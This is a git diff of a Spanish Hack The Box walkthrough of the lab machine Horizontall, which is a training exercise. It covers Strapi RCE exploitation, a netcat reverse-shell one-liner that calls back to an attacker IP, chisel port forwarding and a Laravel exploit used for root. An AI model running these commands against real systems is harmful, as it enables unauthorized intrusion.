@@ -1,5 +1,30 @@
-# 
-
+---
+description: >-
+  G4l1l30 write-up on the easy-difficulty Linux machine Horizontall from
+  https://hackthebox.eu
+title: Hack the Box - Delivery Writeup
+date: 2022-02-05 15:40:00 -0600
+author: RobertEncarnacion
+tag: 
+- htb
+- hacking
+- hack the box
+- redteam
+- linux
+- laravel
+- bruteforce
+- vhost
+- gobuster
+- ffuf 
+- bash
+- web 
+- strapi
+- exploit    
+show_image_post: true
+image: /assets/img/Linux/Horizontall/card.png
+layout: post
+category: blog
+---
 # Summary
 
 ## Info de la maquina
@@ -14,7 +39,7 @@
 
 Editamos ***/etc/hosts***  y agregamos la IP **10.10.11.105** que apunte hacia **horizontall.htb** 
 
-<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/01.png" alt="" width="713" data-align="center">
+![](/assets/img/Linux/Horizontall/01.png)
 
 # Escaneo de Puertos
 
@@ -24,7 +49,7 @@ Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta
 
 Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.11.105``
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/02.png" title="" alt="" width="739">
+![](/assets/img/Linux/Horizontall/02.png)
 
 ```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 22:40 -04
@@ -56,7 +81,7 @@ Vamos a echarle un vistazo al puerto al puerto 80.
 
 ## Website - Port 80
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/03.png)
+![](/assets/img/Linux/Horizontall/03.png)
 
 Como es una maquina "easy" a veces sueltan alguno que otro hint en el source code pero en este caso no hay nada, es una pagina estatica, no hay mucho que hacer. 
 
@@ -64,13 +89,13 @@ Como es una maquina "easy" a veces sueltan alguno que otro hint en el source cod
 
 Usare BurpSuite a ver que puedo encontrar interesante en las peticiones entre el client(yo) y el web server. Antes de empezar a hacer algo con burp, por lo regular permito que intecepte las peticiones de JavaScript (.js), lo podemos hacer de esta forma
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/2022-02-04_19-25.png)
+![](/assets/img/Linux/Horizontall/2022-02-04_19-25.png)
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/08.png" title="" alt="" width="660">
+![](/assets/img/Linux/Horizontall/08.png)
 
 Procedemos a eliminar `^js$|` y listo. Ahora a capturar las peticiones :) 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/06.png)
+![](/assets/img/Linux/Horizontall/06.png)
 
 Me llama la atencion esos scripts con unos nombres algo rarito, vamos a darle una ojeada.
 
@@ -78,7 +103,7 @@ La primera ruta `http://horizontall.htb/js/app.c68eb462.js` , me voy a descagar 
 
 Vamos a darle un vistazo: 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/10.png)
+![](/assets/img/Linux/Horizontall/10.png)
 
 Encontramos un VirtualHost  :), antes de seguir, vamos a ver otra forma de como conseguir el vhost.
 
@@ -100,17 +125,17 @@ La sintaxis es bastante sencilla :
 
 Encontramos algo interesante.
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/04.png" title="" alt="" width="700">
+![](/assets/img/Linux/Horizontall/04.png)
 
 Procedemos agregarlo a nuestro archivo `/etc/hosts` 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/05.png)
+![](/assets/img/Linux/Horizontall/05.png)
 
 ## API Horizontall.
 
 Vamos a echarle un vistazo a lo que acabamos de descubrir
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/11.png)
+![](/assets/img/Linux/Horizontall/11.png)
 
 De nuevo, una pagina estatica(?), vamos a realizar un BruteForce Directory con `ffuf` 
 
@@ -126,23 +151,23 @@ Quedaria asi:
 
 `ffuf -w /usr/share/wordlists/dirb/common.txt -c -u http://api-prod.horizontall.htb/FUZZ`
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/12.png)
+![](/assets/img/Linux/Horizontall/12.png)
 
 Bastante rapido :) 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/13.png)
+![](/assets/img/Linux/Horizontall/13.png)
 
 El path `/admin` me redirreciona hacia aqui, strapi es un CMS, si buscamos con `searchsploit` obtenemos lo siguiente :
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/14.png" title="" alt="" width="671">
+![](/assets/img/Linux/Horizontall/14.png)
 
 Genial, tenemos unos cuantos exploits, pero cual es la version de este CMS?  Podemos ver si encontramos algo en Github o echarle un vistazo a los exploits.
 
 En este caso me basto con la 2da opcion.
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/16.png" title="" alt="" width="705">
+![](/assets/img/Linux/Horizontall/16.png)
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/17.png" title="" alt="" width="741">
+![](/assets/img/Linux/Horizontall/17.png)
 
 En este caso seria el 3er exploit, un `Remote Code Execution(RCE)`
 
@@ -152,31 +177,31 @@ Info : [Mitre CVE 2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE
 
 *`python3 50239.py http: //api-prod.horizontall.htb/*`
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/18.png)
+![](/assets/img/Linux/Horizontall/18.png)
 
 Tenemos unas nuevas credenciales de admin pero hey, tambien podemos realizar un RCE, asi que vamos a dejar netcat a la escucha por el puerto `4444` y amos a ejecutar el siguiente RCE para obtener un reverse shell
 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.142 4444 >/tmp/f`
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/19.png)
+![](/assets/img/Linux/Horizontall/19.png)
 
 Hagamos un upgrade a nuestra shell : python3 -c "import pty;pty.spawn ('/ bin/bash')"
 
 Tenemos user.txt :)
 
-<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/20.png" alt="" width="567">
+![](/assets/img/Linux/Horizontall/20.png)
 
 ## Privilege Escalation
 
 Haciendo checklist basico de enumeracion en busquedad de archivo SUID, procesos, cronjobs,etc, no encontre nada hasta llegar al punto de ver las conexiones que tiene la maquina, usando `netstat -ntlp`  me doy cuenta de varios puertos a la escucha :)
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/21.png" title="" alt="" width="667">
+![](/assets/img/Linux/Horizontall/21.png)
 
 El puerto 1337 es la instancia del API, por otro lado el puerto 3306 es de MySQL :) ....pero y el 8000? este me llama la atencion.
 
 Si hacemos un curl al puerto 8000 obtenemos lo siguiente :
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/22.png" title="" alt="" width="708">
+![](/assets/img/Linux/Horizontall/22.png)
 
 Esta corriendo una instancia de Laravel :)
 
@@ -184,7 +209,7 @@ Bien, antes de seguir me interesa saber si en los archivos de config de Strapi t
 
 En la ruta `/opt/strapi/myapi/config/environments/development` encontramos lo que buscabamos.
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/23.png)
+![](/assets/img/Linux/Horizontall/23.png)
 
 ```bash
 Username: developer
@@ -195,17 +220,17 @@ Intente utilizar estas credenciales via SSH pero no funcionaron.
 
 | **mysql -u developer -p** 
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/24.png" title="" alt="" width="739">
+![](/assets/img/Linux/Horizontall/24.png)
 
 Honestamente no nos interesa nada de la DB, asi que queda hacer un Port Fordward del puerto 8000 a nuestra maquina, en este caso con `Chisel` que es excelente para este tipo de tareas.
 
 Utilizo Python para hacer un simple http server, y procedo a descargar chisel en la maquina
 
-<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/25.png" alt="" width="605">
+![](/assets/img/Linux/Horizontall/25.png)
 
 Procedo a descargar con `wget` 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/26.png)
+![](/assets/img/Linux/Horizontall/26.png)
 
 Le damos permiso de ejecucion `chmod +x chisel` 
 
@@ -219,25 +244,25 @@ En nuestra maquina dejamos a Chisel en escucha de la siguiente forma:
 
 `chisel server -p 8081 --reverse`
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/27.png)
+![](/assets/img/Linux/Horizontall/27.png)
 
 En el lado de la victima (client): 
 
 `./chisel client 10.10.14.142:8081 R:8001:127.0.0.1:8000` 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/28.png)
+![](/assets/img/Linux/Horizontall/28.png)
 
 Confirmamos de nuestro lado : 
 
-<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/29.png" title="" alt="" width="714">
+![](/assets/img/Linux/Horizontall/29.png)
 
 Bien, vamos a ver si esto funciona....
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/30.png)
+![](/assets/img/Linux/Horizontall/30.png)
 
 It's works!. Laravel tiene muchisimos exploits, por suerte tenemos una version en la misma pagina, abajo a la derecha.
 
-<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/31.png" alt="" width="372" data-align="center">
+![](/assets/img/Linux/Horizontall/31.png)
 
 Googleando un poco nos topamos con este repo que contiene el PoC + el exploit: 
 
@@ -255,7 +280,7 @@ Nota: Si tienen algun problema con `Composer` favor actualizar las siguientes li
 
 Y si tenemos el Lab Setup bien, lo veremos asi 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/34.png)
+![](/assets/img/Linux/Horizontall/34.png)
 
 
 
@@ -263,8 +288,10 @@ Bien, ahora a darle al exploit :D , dejamos netcat a la escucha y vamos a obtene
 
 
 
-![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/35.png)
+![](/assets/img/Linux/Horizontall/35.png)
 
 
 
 Somos root :)
+
+__EOF__
